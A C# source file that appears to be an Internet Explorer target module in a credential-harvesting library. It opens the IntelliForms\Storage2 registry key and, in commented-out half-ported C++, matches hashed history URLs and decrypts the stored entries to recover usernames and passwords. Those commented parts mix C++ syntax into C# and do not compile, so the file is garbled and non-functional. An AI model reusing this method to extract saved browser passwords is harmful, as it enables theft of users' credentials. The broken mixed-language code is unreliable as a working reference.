using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

namespace LibCredentials.Targets
{
    public class Iexplorer : Target
    {
        /*private static string GetHashStr(string Password)
        {
            int8
            HashStr[1024];
            HashStr[0] = '\0';

            HCRYPTPROV hProv = 0;
            HCRYPTHASH hHash = 0;
            CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, 0);

            if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash))
            {
                if (CryptHashData(hHash, (uint8*) Password.c_str(), (Password.length() + 1)*2, 0))
                {
                    DWORD dwHashLen = 20;
                    BYTE
                    Buffer[20];

                    if (CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen, 0))
                    {
                        CryptDestroyHash(hHash);
                        CryptReleaseContext(hProv, 0);
                        int8
                        TmpBuf[128];

                        uint8 tail = 0;
                        for (int32 i = 0; i < 20; i++)
                        {
                            tail += Buffer[i];
                            wsprintf(TmpBuf, "%s%2.2X", HashStr, Buffer[i]);
                            strcpy(HashStr, TmpBuf);
                        }

                        wsprintf(TmpBuf, "%s%2.2X", HashStr, tail);
                        strcpy(HashStr, TmpBuf);
                    }
                }
            }

            return HashStr;
        }*/

        protected override void _GetCredentials(List<Credential> credentials)
        {
            var hKey =
                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", false);
            if (hKey == null)
                return;

            for (var i = 0; i < hKey.SubKeyCount; i++)
                Console.WriteLine();

            /*for (int i = 0;; i++)
            {
                string Val;
                int Size = 1024;
                if (RegEnumValue(hKey, i, Val, &Size, 0, 0, 0, 0) == ERROR_NO_MORE_ITEMS)
                    break;

                var UrlHistory = new UrlHistoryWrapper().GetUrlHistory().Select(h => h.pwcsUrl);
                    foreach (string urlHis in UrlHistory)
                    {
                        if (GetHashStr(urlHis) != Val)
                        continue;

                        Credential credential = new Credential();
                        credential.extra = urlHis;

                        DWORD BufferLen, dwType;
                        RegQueryValueEx(hKey, Val, 0, &dwType, 0, &BufferLen);

                        uint8* Buffer = new uint8[BufferLen];
                        if (RegQueryValueEx(hKey, Val, 0, &dwType, Buffer, &BufferLen) == ERROR_SUCCESS)
                        {
                            Win32.DATA_BLOB DataIn;
                            DataIn.pbData = Buffer;
                            DataIn.cbData = BufferLen;

                            Win32.DATA_BLOB OptionalEntropy;
                            OptionalEntropy.pbData = (uint8*) urlHis.c_str();
                            OptionalEntropy.cbData = (urlHis.length() + 1)*2;

                            Win32.DATA_BLOB DataOut;
                            if (CryptUnprotectData(&DataIn, 0, &OptionalEntropy, 0, 0, 1, &DataOut))
                            {
                                if (DataOut.cbData > 0)
                                {
                                    uint32 HeaderSize = *reinterpret_cast<int32*>(&DataOut.pbData[4]);
                                    uint32 DataSize = *reinterpret_cast<int32*>(&DataOut.pbData[8]);
                                    uint32 DataMax = *reinterpret_cast<int32*>(&DataOut.pbData[20]);

                                    int8* pInfo = (int8*) &DataOut.pbData[36];
                                    int8* pData = (int8*) &DataOut.pbData[HeaderSize];

                                    for (uint32 n = 0; n < DataMax; n++, pInfo += 16)
                                    {
                                        string data 
                                        ((wchar_t*) &DataOut.pbData[HeaderSize + 12 + *pInfo]);

                                        switch (n)
                                        {
                                            case 0:
                                            {
                                                credential.username = data;
                                                break;
                                            }
                                            case 1:
                                            {
                                                credential.password = data;
                                                break;
                                            }
                                        }
                                    }
                                }

                                Win32.LocalFree(DataOut.pbData);
                            }

                            if (DataOut.cbData > 0)
                                credentials.push_back(credential);

                            delete[] Buffer;
                        }
                    }
            }

            RegCloseKey(hKey);*/
        }
    }

    internal static class IexplorerSupport
    {
        // Used bu the AddHistoryEntry method.
        /// <summary>
        /// </summary>
        public enum AddurlFlag : uint
        {
            // Write to both the visited links and the dated containers.
            /// <summary>
            /// </summary>
            AddurlAddtohistoryandcache = 0,

            // Write to only the visited links container.
            /// <summary>
            /// </summary>
            AddurlAddtocache = 1
        }

        // Flag on the dwFlags parameter of the STATURL structure, used by the SetFilter method.
        /// <summary>
        /// </summary>
        public enum Staturlflags : uint
        {
            // Flag on the dwFlags parameter of the STATURL structure indicating that the item is in the cache.
            /// <summary>
            /// </summary>
            StaturlflagIscached = 0x00000001,

            // Flag on the dwFlags parameter of the STATURL structure indicating that the item is a top-level item.
            /// <summary>
            /// </summary>
            StaturlflagIstoplevel = 0x00000002
        }

        // Used by QueryUrl method
        /// <summary>
        /// </summary>
        public enum StaturlQueryflags : uint
        {
            // The specified URL is in the content cache.
            StaturlQueryflagIscached = 0x00010000,
            // Space for the URL is not allocated when querying for STATURL.
            StaturlQueryflagNourl = 0x00020000,
            // Space for the Web page's title is not allocated when querying for STATURL.
            StaturlQueryflagNotitle = 0x00040000,
            // The item is a top-level item.
            StaturlQueryflagToplevel = 0x00080000
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
        public interface IEnumSTATURL
        {
            void Next(int celt, ref Staturl rgelt, out int pceltFetched);
            //Returns the next \"celt\" URLS from the cache
            void Skip(int celt); //Skips the next \"celt\" URLS from the cache. doed not work.
            void Reset(); //Resets the enumeration
            void Clone(out IEnumSTATURL ppenum); //Clones this object
            void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, Staturlflags dwFlags);
            //Sets the enumeration filter
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
        public interface IUrlHistoryStg
        {
            void AddUrl(string pocsUrl, string pocsTitle, AddurlFlag dwFlags); //Adds a new history entry
            void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!

            void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, StaturlQueryflags dwFlags,
                ref Staturl lpStaturl); //Returns a STATURL for a given URL
            void BindToObject([In] string pocsUrl, [In] Uuid riid, IntPtr ppvOut); //Binds to an object. does not work!
            object EnumUrls { [return: MarshalAs(UnmanagedType.IUnknown)] get; } //Returns an enumerator for URLs
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
        public interface IUrlHistoryStg2 : IUrlHistoryStg
        {
            new void AddUrl(string pocsUrl, string pocsTitle, AddurlFlag dwFlags); //Adds a new history entry
            new void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!

            new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, StaturlQueryflags dwFlags,
                ref Staturl lpStaturl); //Returns a STATURL for a given URL
            new void BindToObject([In] string pocsUrl, [In] Uuid riid, IntPtr ppvOut);
            //Binds to an object. does not work!
            new object EnumUrls { [return: MarshalAs(UnmanagedType.IUnknown)] get; } //Returns an enumerator for URLs

            void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify,
                object punkIsFolder); //does not work!
            void ClearHistory(); //Removes all history items
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Staturl
        {
            public int CbSize;

            [MarshalAs(UnmanagedType.LPWStr)] public string PwcsUrl;
            [MarshalAs(UnmanagedType.LPWStr)] public string PwcsTitle;

            public FILETIME FtLastVisited;
            public FILETIME FtLastUpdated;
            public FILETIME FtExpires;

            public Staturlflags DwFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Uuid
        {
            public int Data1;
            public short Data2;
            public short Data3;
            public byte[] Data4;
        }

        [ComImport]
        [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
        public class UrlHistoryClass
        {
        }

        public class UrlHistoryWrapper
        {
            private IUrlHistoryStg2 _urlHistory;

            public UrlHistoryWrapper()
            {
                _urlHistory = (IUrlHistoryStg2) new UrlHistoryClass();
            }

            public void Dispose()
            {
                Marshal.ReleaseComObject(_urlHistory);
                _urlHistory = null;
            }

            public List<Staturl> GetUrlHistory()
            {
                var list = new List<Staturl>();

                var enumrator = (IEnumSTATURL) _urlHistory.EnumUrls;
                while (true)
                {
                    var staturl = new Staturl();

                    int index;
                    enumrator.Next(1, ref staturl, out index);
                    if (index == 0)
                        break;

                    list.Add(staturl);
                }

                enumrator.Reset();
                return list;
            }
        }
    }
}